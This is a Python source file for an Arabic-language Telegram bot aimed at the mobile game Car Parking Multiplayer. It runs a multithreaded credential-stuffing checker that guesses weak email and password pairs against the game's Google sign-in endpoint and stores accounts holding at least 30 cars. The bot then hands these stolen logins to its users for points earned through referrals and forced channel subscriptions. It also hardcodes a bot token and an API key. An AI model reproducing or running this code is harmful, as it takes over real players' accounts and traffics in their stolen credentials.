import urllib.request
import urllib.parse
import json
import random
import time
import sys
import os
import threading
import string
import logging
from datetime import datetime
from flask import Flask
import telebot
from telebot import types

# ================== الإعدادات العامة ==================
BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"
ADMIN_ID = "7075895496"
ADMIN_USERNAME = "@XOREYT"
THREADS = 100
BOT_LINK = "https://t.me/Xoregrops_bot"

# ================== إعدادات الملفات ==================
DB_FILE = "database.json"

logging.basicConfig(
    filename="logs.txt",
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def log_action(action, user_id, details=""):
    logging.info(f"ACTION: {action} | USER: {user_id} | DETAILS: {details}")

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: pass
    return {"users": {}, "channels": {}, "banned": [], "settings": {"daily_gift": 1, "ref_points": 5, "min_cars": 30, "maintenance": False}}

def save_db():
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(db, f, ensure_ascii=False, indent=4)
    except Exception as e:
        logging.error(f"Failed to save DB: {e}")

db = load_db()
users = db.get("users", {})
channels = db.get("channels", {})
banned_users = db.get("banned", [])
settings = db.get("settings", {"daily_gift": 1, "ref_points": 5, "min_cars": 30, "maintenance": False})

# ================== الحالة ==================
good = 0
bad = 0
running = False
STOP_FLAG = threading.Event()
lock = threading.Lock()

# ================== Flask ==================
app = Flask(__name__)

@app.route("/")
def index():
    return "Bot is Online"

def keep_alive():
    def run():
        try:
            app.run(host="0.0.0.0", port=10000, debug=False)
        except: pass
    t = threading.Thread(target=run, daemon=True)
    t.start()

bot = telebot.TeleBot(BOT_TOKEN)

# ================== دوال مساعدة ==================
def is_banned(user_id): return str(user_id) in banned_users
def is_admin(user_id): return str(user_id) == ADMIN_ID

def get_user(user_id):
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"points": 0, "refs": 0, "referred_by": None, "joined": time.time(), "last_daily": 0, "hits_bought": 0, "total_earned": 0, "level": 1}
        save_db()
    return users[uid]

def add_points(user_id, amount, reason="unknown"):
    uid = str(user_id)
    user = get_user(uid)
    user["points"] += amount
    user["total_earned"] += amount if amount > 0 else 0
    new_level = 1 + (user["total_earned"] // 10)
    if new_level > user["level"]:
        user["level"] = new_level
        try: bot.send_message(uid, f"🎉 مبروك! لقد وصلت للمستوى {new_level}!")
        except: pass
    save_db()
    log_action("ADD_POINTS", uid, f"+{amount}")

def check_forced_sub(message):
    if is_admin(message.from_user.id): return True
    if not channels: return True
    not_joined = []
    for ch_id, ch_name in channels.items():
        try:
            member = bot.get_chat_member(ch_id, message.from_user.id)
            if member.status in ['left', 'kicked']: not_joined.append(ch_name)
        except: not_joined.append(ch_name)
    if not_joined:
        markup = types.InlineKeyboardMarkup(row_width=1)
        for ch_id, ch_name in channels.items():
            try:
                chat_info = bot.get_chat(ch_id)
                link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
                markup.add(types.InlineKeyboardButton(text=f"📢 {ch_name}", url=link))
            except: pass
        markup.add(types.InlineKeyboardButton(text="✅ تحقق", callback_data="check_sub"))
        bot.send_message(message.chat.id, "⚠️ <b>يجب الاشتراك أولاً:</b>", reply_markup=markup, parse_mode="HTML")
        return False
    return True

def get_main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    if is_admin(user_id):
        markup.add("▶️ بدء الصيد", "🛑 إيقاف الصيد")
        markup.add("🏪 المتجر", "💎 نقاطي")
        markup.add("📢 إذاعة", "⚙️ القنوات")
        markup.add("📊 الإحصائيات", "🚫 الحظر")
        markup.add("📜 السجل", "📤 التصدير")
    else:
        markup.add("🏪 المتجر", "💎 نقاطي")
        markup.add("🎁 هدية", "🔗 إحالة")
        markup.add("🏆 المتصدرين", "ℹ️ معلومات")
    return markup

# ================== دوال الصيد ==================
def http_post(url, json_data=None, headers=None, timeout=10):
    try:
        data = json.dumps(json_data).encode('utf-8') if json_data else None
        req = urllib.request.Request(url, data=data, method='POST')
        if headers:
            for k, v in headers.items(): req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore')
    except: return 0, ''

def get_car_count(id_token):
    try:
        url = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
        headers = {"authorization": f"Bearer {id_token}", "content-type": "application/json", "user-agent": "CarParking/265"}
        status, body = http_post(url, {"data": None}, headers, timeout=10)
        if status == 200:
            data = json.loads(body)
            if 'result' in data:
                cars = json.loads(data['result'])
                return len(cars) if isinstance(cars, list) else len(cars.get('cars', []))
    except: pass
    return 0

def check_account(email, password):
    global good, bad
    try:
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_IOS"}
        headers = {"User-Agent": "CarParking/265", "Content-Type": "application/octet-stream"}
        
        status, body = http_post(url, payload, headers, timeout=10)
        if status == 200:
            res_json = json.loads(body)
            id_token = res_json.get('idToken')
            if id_token:
                cars = get_car_count(id_token)
                if cars >= settings.get("min_cars", 30):
                    with lock: good += 1
                    with open("stock.txt", 'a', encoding='utf-8') as f: f.write(f'{email}:{password}:{cars}\n')
                else:
                    with lock: bad += 1
        else:
            with lock: bad += 1
    except: pass

FIRST_NAMES = ['john', 'mike', 'sara', 'ali', 'omar', 'lina', 'adam', 'huda', 'kareem', 'noor']
WORDS = ['cool', 'fast', 'dark', 'king', 'star', 'fire', 'wolf', 'lion', 'sky', 'pro']
PASSWORDS = ['12345678', '123456789', 'password', '123456', '123123', '1234567', '00000000', '12345', 'qwerty']

def generate_credentials():
    pattern = random.randint(0, 3)
    if pattern == 0: name = random.choice(FIRST_NAMES) + ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    elif pattern == 1: name = random.choice(FIRST_NAMES) + random.choice(['_', '.']) + random.choice(FIRST_NAMES)
    elif pattern == 2: name = random.choice(WORDS) + random.choice(['', '123', '2023'])
    else: name = 'user' + str(random.randint(1000, 9999))
    return name.lower() + '@gmail.com', random.choice(PASSWORDS)

def worker():
    while not STOP_FLAG.is_set():
        email, password = generate_credentials()
        check_account(email, password)
        time.sleep(random.uniform(0.001, 0.01))

def run_checker():
    global running, good, bad
    with lock: good = 0; bad = 0
    running = True
    STOP_FLAG.clear()
    for _ in range(THREADS): threading.Thread(target=worker, daemon=True).start()
    while running and not STOP_FLAG.is_set(): time.sleep(10)

# ================== أوامر البوت ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_banned(message.from_user.id): return bot.reply_to(message, "🚫 محظور.")
    if not check_forced_sub(message): return
    
    user = get_user(message.from_user.id)
    ref_id = message.text.split()[1] if len(message.text.split()) > 1 else None
    if ref_id and ref_id != str(message.from_user.id) and user["referred_by"] is None:
        try:
            if ref_id in users:
                user["referred_by"] = ref_id
                user["refs"] += 1
                users[ref_id]["refs"] += 1
                add_points(ref_id, settings.get("ref_points", 5), "referral")
                save_db()
                bot.send_message(int(ref_id), f"🎉 شخص جديد دخل! +{settings.get('ref_points', 5)} نقاط.")
        except: pass

    text = f"👋 <b>أهلاً {message.from_user.first_name}!</b>\n\n💎 نقاطك: {user['points']}\n📈 مستواك: {user['level']}"
    bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(message.from_user.id), parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🏪 المتجر")
def shop(message):
    user = get_user(message.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚗 صيدة واحدة (1 نقطة)", callback_data="buy_1"))
    markup.add(types.InlineKeyboardButton("📦 5 صيدات (4 نقاط)", callback_data="buy_5"))
    bot.send_message(message.chat.id, f"🛒 المتجر\nرصيدك: {user['points']}", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def buy_hit(call):
    amount = int(call.data.split("_")[1])
    cost = {1: 1, 5: 4}[amount]
    user = get_user(call.from_user.id)
    
    if user["points"] < cost: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
    try:
        with open("stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
        if len(lines) < amount: return bot.answer_callback_query(call.id, "⚠️ المخزن فاضي.", show_alert=True)
        
        bought = lines[:amount]
        with open("stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[amount:])
        user["points"] -= cost
        save_db()
        bot.send_message(call.from_user.id, f"✅ <b>تم الشراء:</b>\n<code>{''.join(bought)}</code>", parse_mode="HTML")
    except: bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "💎 نقاطي")
def my_points(message):
    user = get_user(message.from_user.id)
    bot.reply_to(message, f"💎 نقاطك: <b>{user['points']}</b>\n📈 مستواك: <b>{user['level']}</b>\n👥 إحالاتك: <b>{user['refs']}</b>", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🔗 إحالة")
def ref_link(message):
    link = f"{BOT_LINK}?start={message.from_user.id}"
    bot.reply_to(message, f"🔗 رابطك:\n<code>{link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "🎁 هدية")
def daily_gift(message):
    user = get_user(message.from_user.id)
    now = time.time()
    if now - user["last_daily"] < 86400:
        remain = int(86400 - (now - user["last_daily"]))
        return bot.reply_to(message, f"⚠️ متبقي: {remain//3600} ساعة.")
    user["last_daily"] = now
    add_points(message.from_user.id, settings.get("daily_gift", 1), "daily")
    bot.reply_to(message, "🎁 حصلت على نقطة!")

@bot.message_handler(func=lambda message: message.text == "🏆 المتصدرين")
def top_users(message):
    sorted_users = sorted(users.items(), key=lambda x: x[1].get("total_earned", 0), reverse=True)[:5]
    text = "🏆 <b>أفضل 5:</b>\n"
    for i, (uid, data) in enumerate(sorted_users, 1):
        text += f"{i}. ID: <code>{uid}</code> - ⭐ {data.get('points', 0)}\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text == "ℹ️ معلومات")
def bot_info(message):
    text = f"🤖 بوت Car Parking\n👨‍💻 المطور: {ADMIN_USERNAME}\n⚡ السرعة: {THREADS}"
    bot.reply_to(message, text)

# ================== أوامر الأدمن ==================
@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "▶️ بدء الصيد")
def admin_start(message):
    global running
    if running: return bot.reply_to(message, "⚠️ شغال.")
    msg = bot.reply_to(message, "⏳ جاري التجهيز...")
    def update_progress():
        for i in range(1, 101):
            if STOP_FLAG.is_set(): break
            try:
                filled = "█" * (i // 10) + "░" * (10 - i // 10)
                bot.edit_message_text(f"⏳ <b>جاري الصيد...</b>\n[{filled}] {i}%", msg.chat.id, msg.message_id, parse_mode="HTML")
            except: pass
            time.sleep(1.5)
    threading.Thread(target=run_checker, daemon=True).start()
    threading.Thread(target=update_progress, daemon=True).start()

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🛑 إيقاف الصيد")
def admin_stop(message):
    global running
    STOP_FLAG.set(); running = False
    bot.reply_to(message, "🛑 تم الإيقاف.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📢 إذاعة")
def admin_broadcast_start(message):
    msg = bot.reply_to(message, "📢 أرسل الرسالة الآن:")
    bot.register_next_step_handler(msg, admin_broadcast_send)

def admin_broadcast_send(message):
    bot.reply_to(message, "⏳ جاري الإرسال...")
    count = 0
    for uid in list(users.keys()):
        try:
            bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
            count += 1; time.sleep(0.05)
        except: pass
    bot.send_message(ADMIN_ID, f"✅ تم الإرسال لـ {count} شخص.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📊 الإحصائيات")
def admin_stats(message):
    total_hits = sum(1 for _ in open("stock.txt")) if os.path.exists("stock.txt") else 0
    text = f"📊 <b>إحصائيات:</b>\n👥 المستخدمين: {len(users)}\n📦 المخزن: {total_hits}\n🏃 الحالة: {'شغال' if running else 'متوقف'}"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "⚙️ القنوات")
def admin_channels(message):
    text = "⚙️ <b>القنوات:</b>\n"
    for c_id, c_n in channels.items(): text += f"- {c_n} (<code>{c_id}</code>)\n"
    text += "\nإضافة: <code>/addchannel @username</code>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['addchannel'])
def add_channel(message):
    if not is_admin(message.from_user.id): return
    try:
        ch = message.text.split()[1]
        if ch.startswith('@'):
            info = bot.get_chat(ch)
            channels[str(info.id)] = info.title
        else: channels[str(ch)] = "قناة " + str(ch)
        save_db()
        bot.reply_to(message, "✅ تم إضافة القناة.")
    except: bot.reply_to(message, "❌ تأكد أن البوت أدمن في القناة.")

@bot.message_handler(commands=['delchannel'])
def del_channel(message):
    if not is_admin(message.from_user.id): return
    try:
        ch = message.text.split()[1]
        if ch in channels:
            del channels[ch]
            save_db()
            bot.reply_to(message, "✅ تم الحذف.")
    except: bot.reply_to(message, "❌ خطأ.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📤 التصدير")
def admin_export(message):
    try:
        with open("stock.txt", 'rb') as f: bot.send_document(message.chat.id, f, caption="📦 المخزن")
    except: bot.reply_to(message, "❌ لا يوجد ملف.")

@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📜 السجل")
def admin_logs(message):
    try:
        with open("logs.txt", 'r', encoding='utf-8') as f: lines = f.readlines()[-20:]
        bot.reply_to(message, "📜 <b>السجل:</b>\n<code>" + "".join(lines) + "</code>", parse_mode="HTML")
    except: bot.reply_to(message, "❌ لا يوجد سجل.")

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_sub_cb(call):
    if check_forced_sub(call.message): bot.send_message(call.from_user.id, "✅ تم التحقق! أرسل /start.")
    else: bot.answer_callback_query(call.id, "❌ لم تشترك بعد.", show_alert=True)

# ================== تشغيل ==================
if __name__ == "__main__":
    keep_alive()
    logging.info("Bot Started")
    try: bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except: pass
